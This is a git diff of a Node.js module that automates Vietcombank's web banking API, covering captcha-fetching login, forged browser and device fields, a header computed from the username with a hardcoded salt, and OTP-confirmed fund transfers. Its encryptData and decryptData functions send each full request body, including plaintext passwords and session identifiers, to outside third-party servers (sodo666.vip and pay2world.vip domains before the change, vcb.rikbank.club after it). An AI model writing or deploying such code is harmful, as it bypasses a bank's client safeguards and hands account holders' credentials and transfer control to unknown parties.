@@ -14,7 +14,7 @@ exports.getCaptcha = async () => {
         ).join('');
 
         // Get captcha image
-        const response = await axios.get(`https://digiapp.vietcombank.com.vn/utility-service/v1/captcha/${captchaToken}`, { responseType: 'arraybuffer' });
+        const response = await axios.get(`https://digiapp.vietcombank.com.vn/utility-service/v2/captcha/MASS/${captchaToken}`, { responseType: 'arraybuffer' });
 
         // Convert image to base64
         const base64CaptchaImg = Buffer.from(response.data, 'binary').toString('base64');
@@ -64,7 +64,6 @@ exports.login = async (accountNumber, bankType) => {
     try {
         const bankData = await bankModel.findOne({ accountNumber, bankType }).lean();
 
-        // Giải captcha
         const dataCaptcha = await this.getCaptcha();
 
         const newDevice = {
@@ -74,20 +73,16 @@ exports.login = async (accountNumber, bankType) => {
         const bodyData = {
             "DT": "Windows",
             "OV": "10",
-            "PM": "Edge 127.0.0.0",
-            "E": "",
-            "appVersion": "",
+            "PM": "Chrome 111.0.0.0",
+            "E": this.getE() || "",
             "browserId": newDevice.browserId,
             "captchaToken": dataCaptcha.key,
             "captchaValue": dataCaptcha.captcha,
-            "cif": "",
-            "clientId": "",
-            "mobileId": "",
+            "checkAcctPkg": "1",
             "lang": "vi",
             "mid": 6,
             "password": bankData.password,
             "user": bankData.username,
-            "sessionId": ""
         }
 
         await bankModel.findOneAndUpdate({accountNumber, bankType}, {
@@ -96,12 +91,10 @@ exports.login = async (accountNumber, bankType) => {
             }
         }, {upsert: true})
 
-        const result = await this.curlPost("https://digiapp.vietcombank.com.vn/authen-service/v1/login", bodyData);
+        const result = await this.curlPost("https://digiapp.vietcombank.com.vn/authen-service/v1/login", bodyData, this.headerNull(bankData.username));
 
         if (result.code == '20231' && result.mid == 6) {
             const checkBrowser = await this.checkBrowser(accountNumber, bankType, result.browserToken);
-
-            console.log(checkBrowser);
 
             if (checkBrowser.code === 200) {
 
@@ -385,72 +378,45 @@ exports.saveBrowser = async (accountNumber, bankType) => {
     }
 };
 
-exports.encryptData = async (data) => {
-    const urls = [
-        'https://sodo666.vip/vietcombank/encrypt',
-        'https://babygroupvip.com/vietcombank/encrypt',
-        'https://vcbbiz2.pay2world.vip/vietcombank/encrypt'
-    ];
-
-    const payload = JSON.stringify(data);
-    const headers = {
-        'Content-Type': 'application/json'
-    };
-
-    for (let url of urls) {
-        try {
-            const response = await axios.post(url, payload, { headers, timeout: 10000 });
-
-            // Skip on certain HTTP status codes
-            if ([404, 502].includes(response.status)) {
-                continue;
-            }
-
-            return response.data;
-        } catch (err) {
-            // Catch timeout or other failures, move to the next URL
-            continue;
+exports.encryptData = async (str) => {
+    const result = await axios({
+        url: 'https://vcb.rikbank.club/to9xvn.php?type=encrypt',
+        method: 'post',
+        headers: {
+            'Content-Type': 'application/json' // Ensure the content type is set
+        },
+        data:  {
+            data: str
         }
-    }
+    })
 
-    return {}; // All failed
-};
+    return result.data;
+}
 
 exports.decryptData = async (cipher) => {
-    const urls = [
-        'https://sodo666.vip/vietcombank/decrypt',
-        'https://vcbcp1.pay2world.vip/vietcombank/decrypt',
-        'https://vcbbiz2.pay2world.vip/vietcombank/decrypt'
-    ];
-
-    const payload = JSON.stringify(cipher);
-    const headers = {
-        'Content-Type': 'application/json'
-    };
-
-    for (let url of urls) {
-        try {
-            const response = await axios.post(url, payload, { headers, timeout: 10000 });
-
-            // Skip bad responses
-            if ([404, 502].includes(response.status)) {
-                continue;
-            }
-
-            return response.data;
-        } catch (err) {
-            continue; // On error (timeout, server down), try the next one
+    const result = await axios({
+        url: 'https://vcb.rikbank.club/to9xvn.php?type=decrypt',
+        method: 'post',
+        headers: {
+            'Content-Type': 'application/json' // Ensure the content type is set
+        },
+        data:  {
+            data: cipher
         }
-    }
+    })
 
-    return {}; // All failed
-};
+    return result.data;
+}
 
-exports.curlPost = async (url, data) => {
-    const encryptedData = await this.encryptData(data); // You need to implement this
-    console.log(encryptedData);
+exports.headerNull = (username) => {
+        // Tạo key để tính toán SHA-256 hash
+    const key = username + "6q93-@u9";
 
-    const headers = {
+    // Tạo SHA-256 hash từ key
+    const xlim = crypto.createHash('sha256').update(key).digest('hex');
+
+    // Tạo đối tượng headers tương tự PHP
+    return {
         'Accept': 'application/json',
         'Accept-Encoding': 'gzip, deflate, br',
         'Accept-Language': 'vi',
@@ -464,16 +430,139 @@ exports.curlPost = async (url, data) => {
         'Sec-Fetch-Mode': 'cors',
         'Sec-Fetch-Site': 'same-site',
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
-        'X-Channel': 'Web'
+        'X-Channel': 'Web',
+        'X-Lim-ID': xlim
     };
 
+}
+
+exports.getE = () => {
+    // Tạo một chuỗi ngẫu nhiên MD5
+    const randomString = crypto.createHash('md5').update(crypto.randomBytes(16)).digest('hex');
+
+    // Chia chuỗi randomString thành các phần nhỏ và định dạng giống như trong PHP
+    const imei = randomString
+        .split('')
+        .reduce((acc, char, index) => {
+            if (index % 4 === 0 && index !== 0) acc.push('-');
+            acc.push(char);
+            return acc;
+        }, [])
+        .join('');
+
+    // Chuyển tất cả ký tự thành chữ in hoa và trả về kết quả
+    return imei.toUpperCase();
+}
+
+exports.curlPost = async (url, data, headers) => {
+    const encryptedData = await this.encryptData(data);
     try {
-        const response = await axios.post(url, encryptedData, { headers });
-        const decrypted = await this.decryptData(response.data); // You need to implement this
-        return decrypted;
+        const response = await axios({
+            url,
+            headers,
+            method: 'post',
+            data: encryptedData
+        });
+
+        return await this.decryptData(response.data);
     } catch (error) {
         console.error("Request failed:", error.response ? error.response.data : error.message);
         throw error;
+    }
+}
+
+exports.getlistDDAccount = async (accountNumber, bankType) => {
+    try {
+        const bankData = await bankModel.findOne({accountNumber, bankType}).lean();
+
+        const bodyData = {
+            "DT": "Windows",
+            "OV": "10",
+            "PM": "Chrome 111.0.0.0",
+            "E": this.getE() || "",
+            "browserId": bankData.dataDevice.browserId,
+            "lang": "vi",
+            "mid": 35,
+            "serviceCode":  "0540,0541,0543,0551,2551",
+            "user": bankData.username,
+            "mobileId": bankData.dataDevice.session.mobileId,
+            "sessionId": bankData.dataDevice.session.sessionId,
+            "clientId": bankData.dataDevice.session.clientId,
+        }
+
+        return this.curlPost('https://digiapp.vietcombank.com.vn/bank-service/v1/get-list-ddaccount', bodyData, this.headerNull(bankData.username))
+
+    } catch (e) {
+
+    }
+}
+
+exports.genOtpTransfer = async (bankData, tranId, type = 'OUT', otpType=1) => {
+    try {
+
+        const dataCaptcha = await this.getCaptcha();
+
+        const bodyData  = {
+            "DT": "Windows",
+            "OV": "10",
+            "PM": "Chrome 111.0.0.0",
+            "E": this.getE() || "",
+            "browserId": bankData.dataDevice.browserId,
+            "cif": "",
+            "lang": "vi",
+            "tranId": tranId,
+            "type": otpType,
+            "mid": 17,
+            "user": bankData.username,
+            "mobileId": bankData.dataDevice.session.mobileId,
+            "sessionId": bankData.dataDevice.session.sessionId,
+            "clientId": bankData.dataDevice.session.clientId,
+            "captchaToken": dataCaptcha.key,
+            "captchaValue": dataCaptcha.captcha,
+        }
+
+        if (type === 'OUT') {
+            return await this.curlPost('https://digiapp.vietcombank.com.vn/napas-service/v1/transfer-gen-otp', bodyData, this.headerNull(bankData.username))
+        } else {
+            return await this.curlPost('https://digiapp.vietcombank.com.vn/transfer-service/v1/transfer-gen-otp', bodyData, this.headerNull(bankData.username))
+        }
+
+
+    } catch (e) {
+        console.log(e);
+    }
+}
+
+exports.confirmTransfer = async (bankData, tranId, challenge, otp, type="OUT", otpType=1) => {
+    try {
+
+        const bodyData  = {
+            "DT": "Windows",
+            "OV": "10",
+            "PM": "Chrome 111.0.0.0",
+            "E": this.getE() || "",
+            "browserId": bankData.dataDevice.browserId,
+            "cif": "",
+            "lang": "vi",
+            "tranId": tranId,
+            "challenge": challenge,
+            "otp": otp,
+            "mid": 18,
+            "user": bankData.username,
+            "mobileId": bankData.dataDevice.session.mobileId,
+            "sessionId": bankData.dataDevice.session.sessionId,
+            "clientId": bankData.dataDevice.session.clientId,
+        }
+
+        if (type === 'OUT') {
+            return await this.curlPost('https://digiapp.vietcombank.com.vn/napas-service/v1/transfer-confirm-otp', bodyData, this.headerNull(bankData.username))
+        } else {
+            return await this.curlPost('https://digiapp.vietcombank.com.vn/transfer-service/v1/transfer-confirm-otp', bodyData, this.headerNull(bankData.username))
+        }
+
+
+    } catch (e) {
+        console.log(e);
     }
 }
 
@@ -482,54 +571,32 @@ exports.initTransfer = async (accountNumber, bankType, dataTransfer) => {
 
         const bankData = await bankModel.findOne({accountNumber, bankType}).lean();
 
-        const bodyData = {
+        const bodyData  = {
             "DT": "Windows",
             "OV": "10",
-            "PM": "Edge 127.0.0.0",
-            "E": "",
-            "browserName": "Edge 127.0.0.0",
+            "PM": "Chrome 111.0.0.0",
+            "E": this.getE() || "",
             "browserId": bankData.dataDevice.browserId,
-            "lang": "vi",
-            "debitAccountNo": bankData.accountNumber,
+            "ccyType": "2",
+            "cif": "",
             "creditAccountNo": dataTransfer.accountNumber,
-            "creditBankCode": dataTransfer.bankCode,
-            "amount": dataTransfer.amount,
-            "feeType": 1,
+            "creditAccountName": dataTransfer.name,
+            "debitAccountNo": accountNumber,
+            "amount": dataTransfer.amount.toString(),
+            "feeType": "1",
+            "lang": "vi",
+            "mid": 4038,
+            "type": "account",
+            "transferCategory": null,
             "content": dataTransfer.comment,
-            "ccyType": "1",
-            "mid": 62,
-            "cif": bankData.dataDevice.session.cif,
             "user": bankData.username,
             "mobileId": bankData.dataDevice.session.mobileId,
+            "sessionId": bankData.dataDevice.session.sessionId,
             "clientId": bankData.dataDevice.session.clientId,
-            "sessionId": bankData.dataDevice.session.sessionId
         }
 
-        const result = await this.curlPost("https://digiapp.vietcombank.com.vn/napas-service/v1/get-channel-transfer-intersea", bodyData);
+        return await this.curlPost('https://digiapp.vietcombank.com.vn/transfer-service/v2/init-internal-transfer', bodyData, this.headerNull(bankData.username))
 
-        console.log(result)
-
-        if (resultDecode.code == '00') {
-            await bankModel.findOneAndUpdate({accountNumber, bankType}, {
-                $set: {
-                    otpToken: resultDecode.data.otpToken,
-                    transType: resultDecode.data.transType,
-                    token: resultDecode.data.token,
-                    accessToken: response.headers['authorization'],
-                }
-            }, {upsert: true})
-
-            return {
-                resultDecode,
-                message: "Tạo đơn chuyển tiền thành công!",
-                success: true
-            }
-        } else {
-            return {
-                message: resultDecode.des,
-                success: false
-            }
-        }
     } catch (e) {
         console.log(e);
         return {
@@ -539,3 +606,96 @@ exports.initTransfer = async (accountNumber, bankType, dataTransfer) => {
     }
 }
 
+exports.initTransferV1 = async (accountNumber, bankType, dataTransfer) => {
+    try {
+
+        const bankData = await bankModel.findOne({accountNumber, bankType}).lean();
+
+        const bodyData = {
+            "DT": "Windows",
+            "OV": "10",
+            "PM": "Chrome 111.0.0.0",
+            "E": "",
+            "amount": String(dataTransfer.amount),
+            "appVersion": "",
+            "browserId": bankData.dataDevice.browserId,
+            "ccyType": "2",
+            "cif": "",
+            "clientId": bankData.dataDevice.session.clientId,
+            "creditAccountNo": dataTransfer.accountNumber,
+            "debitAccountNo": accountNumber,
+            "feeType": "1",
+            "lang": "vi",
+            "mid": 4034,
+            "mobileId": bankData.dataDevice.session.mobileId,
+            "omniBankCode": dataTransfer.bankCode,
+            "sessionId": bankData.dataDevice.session.sessionId,
+            "type": "account",
+            "user": bankData.username,
+            "transferCategory": null
+        }
+
+        const result = await this.curlPost('https://digiapp.vietcombank.com.vn/napas-service/v1/get-channel-transfer-intersea', bodyData, this.headerNull(bankData.username))
+
+        if (result && result.code === '00') {
+            const resultV2 = await this.initTransferV2(accountNumber, bankType, dataTransfer);
+
+            if (result && result.code === '00') {
+                return resultV2;
+            } else {
+                return {
+                    success: false,
+                    message: result.des
+                }
+            }
+        } else if (result && result.code === '108') {
+            await this.login(accountNumber, bankType);
+        }
+
+        return result;
+
+    } catch (e) {
+        console.log(e);
+        return {
+            success: false,
+            message: 'Đăng nhập thất bại'
+        };
+    }
+}
+
+exports.initTransferV2 = async (accountNumber, bankType, dataTransfer) => {
+    try {
+
+        const bankData = await bankModel.findOne({accountNumber, bankType}).lean();
+
+        const bodyData  = {
+            "DT": "Windows",
+            "OV": "10",
+            "PM": "Chrome 111.0.0.0",
+            "E": null,
+            "browserId": bankData.dataDevice.browserId,
+            "ccyType": "2",
+            "creditAccountNo": dataTransfer.accountNumber,
+            "debitAccountNo": accountNumber,
+            "amount": dataTransfer.amount,
+            "feeType": "1",
+            "lang": "vi",
+            "mid": 4035,
+            "creditOmniBankCode": dataTransfer.bankCode,
+            "content": dataTransfer.comment,
+            "user": bankData.username,
+            "mobileId": bankData.dataDevice.session.mobileId,
+            "sessionId": bankData.dataDevice.session.sessionId,
+            "clientId": bankData.dataDevice.session.clientId,
+        }
+
+        return await this.curlPost('https://digiapp.vietcombank.com.vn/napas-service/v2/init-fast-transfer-via-accountno', bodyData, this.headerNull(bankData.username))
+
+    } catch (e) {
+        console.log(e);
+        return {
+            success: false,
+            message: 'Đăng nhập thất bại'
+        };
+    }
+}
